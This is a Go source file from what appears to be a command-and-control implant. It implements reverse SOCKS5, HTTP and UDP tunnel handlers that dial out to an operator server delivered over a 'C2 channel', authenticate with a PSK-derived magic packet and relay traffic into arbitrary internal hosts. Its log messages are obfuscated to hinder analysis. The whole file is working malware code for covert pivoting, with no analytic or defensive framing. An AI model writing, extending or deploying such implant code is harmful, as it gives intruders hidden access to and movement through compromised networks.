package commands

import (
	"bufio"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"implant/core/obfs"
	Proxy "implant/core/services/proxy"
	"implant/core/services/proxy/bufferpool"
	"implant/core/services/proxy/mux"
	"implant/core/utils"
	"io"
	"log"
	"math"
	"net"
	"strings"
	"sync"
	"time"
)

// HTTP隧道管理（新架构：基于SOCKS5设计）
var (

	// 新架构：HTTP隧道Agent管理
	httpTunnelAgent *HTTPTunnelAgent
	httpTunnelMutex sync.RWMutex

	// HTTP隧道缓冲池
	httpBufferPool = bufferpool.NewPool(math.MaxUint16)
)

// deriveClientMagicPacket 从会话 PSK 派生 64 字节魔法包（与服务端 DeriveMagicPacket 一致），
// 替代固定常量：PSK 每次隧道启动随机生成并经加密 C2 通道下发，魔法包随会话变化
func deriveClientMagicPacket(psk string) [64]byte {
	var out [64]byte
	h := sha256.New()
	h.Write([]byte("http-tunnel-magic-v1"))
	h.Write([]byte(psk))
	sum := h.Sum(nil)
	copy(out[:], sum)
	copy(out[32:], sum)
	return out
}

// HTTPTunnelAgent HTTP隧道Agent（类似ReverseSocksAgent）
type HTTPTunnelAgent struct {
	ServerAddress string
	PSK           string
	Session       *mux.Mux
	Running       bool
	StopChan      chan bool
}

// SOCKS5代理相关功能

// HandleSocks5Connect 已废弃 - 使用反向SOCKS5隧道替代
// 此函数已删除，请使用 HandleReverseSocks5Connect

// HandleReverseSocks5Connect 处理反向SOCKS5连接请求
func HandleReverseSocks5Connect(cmdBuf []byte) ([]byte, error) {
	log.Printf("[SOCKS5] 启动反向连接")

	// 解析命令参数 - 格式: serverAddress|psk|useTLS
	request := string(cmdBuf)
	parts := strings.Split(request, "|")

	if len(parts) < 2 {
		log.Printf("[SOCKS5] 参数格式错误")
		return []byte("REVERSE_SOCKS5_ERROR"), fmt.Errorf("参数格式错误")
	}

	serverAddress := parts[0]
	psk := parts[1]
	useTLS := false

	if len(parts) >= 3 && parts[2] == "true" {
		useTLS = true
	}

	log.Printf("[SOCKS5] 连接到: %s (TLS: %v)", serverAddress, useTLS)

	// 启动反向SOCKS5客户端
	go func() {
		Proxy.ReverseSocksAgent(serverAddress, psk, useTLS)
	}()

	log.Printf("[SOCKS5] 反向连接已启动")
	return []byte("REVERSE_SOCKS5_CONNECT_OK"), nil
}

// HandleReverseSocks5Close 关闭反向SOCKS5隧道（真正关闭 mux 会话与底层连接）
func HandleReverseSocks5Close() ([]byte, error) {
	Proxy.StopReverseSocks5()
	return []byte("REVERSE_SOCKS5_CLOSED"), nil
}

// HandleHTTPTunnel 处理HTTP隧道请求（新架构：基于SOCKS5设计）
func HandleHTTPTunnel(cmdBuf []byte) ([]byte, error) {
	request := string(cmdBuf)

	// 新架构：HTTP隧道连接命令 (格式: serverAddress|psk)
	if strings.Contains(request, "|") && len(strings.Split(request, "|")) == 2 {
		return HandleHTTPTunnelConnect(cmdBuf)
	}

	// UDP隧道连接命令 (格式: serverAddress|psk|udp)
	parts := strings.Split(request, "|")
	if len(parts) == 3 && parts[2] == "udp" {
		return HandleUDPTunnelConnect(cmdBuf)
	}

	log.Printf("[HTTP-TUNNEL] ⚠️ 不支持的HTTP隧道命令格式: %s", request)
	return []byte("HTTP_TUNNEL_ERROR"), fmt.Errorf("不支持的HTTP隧道命令格式")
}

// HandleHTTPTunnelConnect 处理HTTP隧道连接请求（新架构）
func HandleHTTPTunnelConnect(cmdBuf []byte) ([]byte, error) {
	request := string(cmdBuf)
	parts := strings.Split(request, "|")

	if len(parts) != 2 {
		return []byte("HTTP_TUNNEL_CONNECT_ERROR"), fmt.Errorf("参数格式错误")
	}

	serverAddress := parts[0]
	psk := parts[1]

	// 停止现有的HTTP隧道Agent（如果有）
	stopHTTPTunnelAgent()

	// 启动新的HTTP隧道Agent
	go func() {
		startHTTPTunnelAgent(serverAddress, psk)
	}()

	return []byte("HTTP_TUNNEL_CONNECT_OK"), nil
}

// startHTTPTunnelAgent 启动HTTP隧道Agent（新架构）
func startHTTPTunnelAgent(serverAddress, psk string) {
	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oEgfqRvCCibBN4zlmXsXvIzRSokxnEIn0="))
	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNivqdqQKgWxXUJawh2U5V"))
	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pk0W+LPqSsAKibBrVA6UixFGKuRUB8lvS"), serverAddress))
	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pk0W+LPokf8SucwTVIKv9eMQL"), len(psk)))

	httpTunnelMutex.Lock()
	httpTunnelAgent = &HTTPTunnelAgent{
		ServerAddress: serverAddress,
		PSK:           psk,
		Running:       true,
		StopChan:      make(chan bool, 1),
	}
	httpTunnelMutex.Unlock()

	// 🔧 添加重试机制
	for retry := 0; retry < 3; retry++ {
		if retry > 0 {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKhfqTgCNigl2cO+RA1QnAsX2ETJgv6Seqxg=="), retry+1))
		}

		// 检查是否需要停止
		httpTunnelMutex.RLock()
		if !httpTunnelAgent.Running {
			httpTunnelMutex.RUnlock()
			log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oFkPqSuDmibgvVG5Eh9UOLmzTeXclO8IVtaNf+S4g="))
			return
		}
		httpTunnelMutex.RUnlock()

		var conn net.Conn
		var err error

		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKlvqckxGhaB7VEr2PDLU/zQ+cO/8yqpUJDd26Kas1cNUNxQ=="), serverAddress))

		// TCP客户端使用TCP连接
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oSkfqQkTCgchNk2V0v53+JqjAV/FA="))
		conn, err = net.Dial("tcp", serverAddress)

		if err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfgSITLLsmnJQ16UK+Vz/cFHwzmX9xpH4KhhWMrzY6e0cNUNwA=="), retry+1, err))
			if retry == 2 {
				log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oEqfqSpQ+hejLZHYAv93SKuRLeds9J+KxrVNv9WIx49nbACZ0I/28="))
				return
			}
			continue
		}

		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbITLLsmnJQ124CuhNxw=="))

		// 发送HTTP隧道魔法包认证（会话 PSK 派生）
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKkfqRox6uZjp4zlmXsXvIzRSoO9M1qroRDdueJI0GolSkXq1KmWWcqHGH"))
		magicPacket := deriveClientMagicPacket(psk)
		_, err = conn.Write(magicPacket[:])
		if err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfgSIT/7vWbHZ1KdDut0zQTjoXCfY5YV6TOkzSE="), err))
			conn.Close()
			if retry == 2 {
				return
			}
			continue
		}

		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbIZIgeN+ufBzZG54u9XWJlwDeXvtEw5htaNb9RKJ4wGo="))

		// 创建多路复用会话
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKgfqRpBSiXQHVPpcv706KgBjcRtZF8JNsR8o14hw="))
		session := mux.Server(conn, psk)
		httpTunnelMutex.Lock()
		httpTunnelAgent.Session = session
		httpTunnelMutex.Unlock()
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbIT/QtmfwSV6UF+pT8AXTvn2UT5sW/uwMc7Kgdg=="))

		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKjPqTgQaiWD7WBoAi0kCKvT3eXe9J+b5jctP9ebN19WvOOKbAX+Q="))

		for {
			// 检查是否需要停止
			httpTunnelMutex.RLock()
			if !httpTunnelAgent.Running {
				httpTunnelMutex.RUnlock()
				log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oFkPqSuDmibgvVG5Eh9UOLmzTeXclO8IVhbeTyW5959m/AGZ4="))
				session.Close()
				return
			}
			httpTunnelMutex.RUnlock()

			stream, err := session.AcceptStream()
			if err != nil {
				log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfgSITz6iWrIcV2FG+hj6Qnbga8b9wg="), err))
				break
			}
			log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKlvqSuDmibgvWDL0gwmWJkRTTbeBHwqw="))
			go func() {
				log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKhfqRkA+iQTDVPokgyGcncMFrO+QGpYgXDuKaJI0DrHuNmC3A"))
				// 处理HTTP隧道流连接
				if err := handleHTTPTunnelStream(stream); err != nil && err != mux.ErrPeerClosedStream {
					log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfgSIT/QqGjXYPNkzl0uwkaGpQbdZ/9J85diZvL+aIN1/lASliaY"), err))
				} else {
					log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbIZIgeN+ufBzZG54h7WCHmwvdXNtE6I1jeNH+Yr57wmU="))
				}
			}()
		}

		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKm/qRqTyucRbVPpcv706KgBjcRtZF8JNsR8o14hw="))
		session.Close()

		// 如果达到这里，说明连接正常结束，不需要重试
		break
	}

	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKm/o8eNsXDyGXc4xUGYYKSuHeZcxEzZViRfU="))
}

// handleHTTPTunnelStream 处理HTTP隧道流
func handleHTTPTunnelStream(stream net.Conn) error {
	defer stream.Close()

	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oKhfqRkA+iQTDVPokgyGcncMFrO+QGpYgXDuKa9hK4OdUFiCPLAg=="), stream.RemoteAddr(), stream.LocalAddr()))

	// 从流中读取目标地址
	reader := bufio.NewReader(stream)
	targetAddr, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pW8ol5FXiyxTpABu3f5F3vXzvwTGKOsoEdimhng=="), err))
		return err
	}
	targetAddr = strings.TrimSpace(targetAddr)

	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNivqTtyGhRjzVBr0ixWFVBLBI"), targetAddr))

	// 连接到目标地址
	targetConn, err := net.DialTimeout("tcp", targetAddr, 30*time.Second)
	if err != nil {
		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfgSITLLsmnJQ1yrNOtn3wTzlHCmUpsF/eEwTW076UQ="), err))
		// 发送错误响应
		stream.Write([]byte("ER"))
		return err
	}
	defer targetConn.Close()

	log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbITz8vGrNeVOPBOtJ/QTnlHKgfJgBy+wYWLKGTAi9b4Y="), targetAddr))

	// 发送成功响应
	_, err = stream.Write([]byte("OK"))
	if err != nil {
		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pVuoP6Fr1xDDZADWVfIVXvWvwwQa2N8Q1qa01AOO+9hK4PA=="), err))
		return err
	}

	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNoPqRkA+iQTDVFYEiyHCJsSXdX9BJ8aVhZ8Y="))

	// 开始双向数据转发
	var wg sync.WaitGroup
	wg.Add(2)

	// 从服务器流到目标连接
	go func() {
		defer wg.Done()
		buf := httpBufferPool.Get()
		defer httpBufferPool.Put(buf)
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpfqRkA+iQTDYJ6Ei13BVBOZeoAjEPimp1ndvrUD6L4E="))
		n, err := io.CopyBuffer(targetConn, stream, buf[:cap(buf)])
		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpfqckSOiaSrXIZ4hxX5VBOZeoAjEPimp1ndvrUD6L4EEluZD5iKXBLk89MoLsnLhQp12"), n, utils.RelayEndState(err)))
		targetConn.Close() // server->target 结束:关闭 dst(=对端 src),解除对端 targetConn.Read 阻塞
	}()

	// 从目标连接到服务器流
	go func() {
		defer wg.Done()
		buf := httpBufferPool.Get()
		defer httpBufferPool.Put(buf)
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpPqRkA+iQTDYJ6Ei13BVBOFaoBnEOCmp1ndoqUDrL4c="))
		n, err := io.CopyBuffer(stream, targetConn, buf[:cap(buf)])
		log.Printf("%s", fmt.Sprintf(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oNpPqckSOiaSrXIZ4hxX5VBOFaoBnEOCmp1ndoqUDrL4cEluZD5iKXBLk89MoLsnLhQp12"), n, utils.RelayEndState(err)))
		stream.Close() // target->server 结束:关闭 stream(=对端 src),解除对端 stream.Read 阻塞
	}()

	wg.Wait()
	log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbIZIgeN+ufBzZG54h7WCKgBHcQvhE4oViYMc="))
	return nil
}

// stopHTTPTunnelAgent 停止HTTP隧道Agent
func stopHTTPTunnelAgent() {
	httpTunnelMutex.Lock()
	defer httpTunnelMutex.Unlock()

	if httpTunnelAgent != nil && httpTunnelAgent.Running {
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pQ/oFkPqRrROhSxl4zlmXsXvIzRSokxnEIn2qxnk="))
		httpTunnelAgent.Running = false
		if httpTunnelAgent.Session != nil {
			httpTunnelAgent.Session.Close()
		}
		select {
		case httpTunnelAgent.StopChan <- true:
		default:
		}
		log.Print(obfs.Dec("JnLFCF7fPx2KWessBMaSWhe52H1pUfkbIZIgeN+ufBzZG56GP4QBUHCMYJsg0O8pSg=="))
	}
}

// HandleUDPTunnelConnect 处理UDP隧道连接请求（复用反向mux，每条数据报独占一流）
func HandleUDPTunnelConnect(cmdBuf []byte) ([]byte, error) {
	parts := strings.Split(string(cmdBuf), "|")
	if len(parts) < 2 {
		return []byte("UDP_TUNNEL_ERROR"), fmt.Errorf("UDP隧道参数格式错误")
	}
	serverAddress := parts[0]
	psk := parts[1]
	log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QC5LP8eIT/kg2rNTu50yuRd/wjut9RctxDVdimhmw=="), serverAddress))
	go func() {
		conn, err := net.Dial("tcp", serverAddress)
		if err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrLum+6WXqygHiAx+BcrliYsFKUg=="), err))
			return
		}
		magicPacket := deriveClientMagicPacket(psk)
		if _, err := conn.Write(magicPacket[:]); err != nil {
			log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrLum+5FXlxQ/GDxakfL5SvW3qwTGKOsoEdimhng=="), err))
			conn.Close()
			return
		}
		session := mux.Server(conn, psk)
		log.Print(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrL+C+bK8MyDPdDhStf7p1vVrVwz6wPcItq6QNDememXbNrECp"))
		for {
			stream, err := session.AcceptStream()
			if err != nil {
				log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QC5LPEEIT7Itmfoe1yLCetax9tPAeM="), err))
				break
			}
			go handleUDPTunnelStream(stream)
		}
		session.Close()
	}()
	return []byte("UDP_TUNNEL_OK"), nil
}

// handleUDPTunnelStream 处理单个UDP数据报流：读目标+数据报 -> 拨号UDP -> 读响应 -> 回写。
func handleUDPTunnelStream(stream net.Conn) error {
	defer stream.Close()
	var tlen [2]byte
	if _, err := io.ReadFull(stream, tlen[:]); err != nil {
		return err
	}
	target := make([]byte, binary.BigEndian.Uint16(tlen[:]))
	if _, err := io.ReadFull(stream, target); err != nil {
		return err
	}
	udpConn, err := net.Dial("udp", string(target))
	if err != nil {
		log.Printf("%s", fmt.Sprintf(obfs.Dec("Jm/VDCOmPgaKUuJNasmXVhyj0QCrLum+51HcyQDws/9gf6l2sFXKBLBI6F6EOg=="), string(target), err))
		binary.Write(stream, binary.BigEndian, uint32(0))
		return err
	}
	defer udpConn.Close()
	var dlen [4]byte
	if _, err := io.ReadFull(stream, dlen[:]); err != nil {
		return err
	}
	datagram := make([]byte, binary.BigEndian.Uint32(dlen[:]))
	if _, err := io.ReadFull(stream, datagram); err != nil {
		return err
	}
	if _, err := udpConn.Write(datagram); err != nil {
		binary.Write(stream, binary.BigEndian, uint32(0))
		return err
	}
	udpConn.SetReadDeadline(time.Now().Add(5 * time.Second))
	resp := make([]byte, 65535)
	n, err := udpConn.Read(resp)
	if err != nil {
		binary.Write(stream, binary.BigEndian, uint32(0))
		return err
	}
	binary.Write(stream, binary.BigEndian, uint32(n))
	stream.Write(resp[:n])
	return nil
}
